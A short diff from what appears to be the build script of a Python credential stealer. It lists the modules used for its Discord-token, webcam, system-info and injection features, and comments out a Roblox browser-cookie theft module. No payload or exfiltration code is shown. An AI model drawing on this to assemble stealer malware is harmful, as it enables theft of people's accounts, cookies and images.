@@ -605,8 +605,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt"],
                 "injection": ["psutil"],
                 "webcam": ["cv2"],
-                "systeminfo": ["psutil", "pycountry"],
-                "roblox": ["browser-cookie3"]
+                "systeminfo": ["psutil", "pycountry"]
+            #    "roblox": ["browser-cookie3"]
             }
             
             included_modules_pyinstaller = [
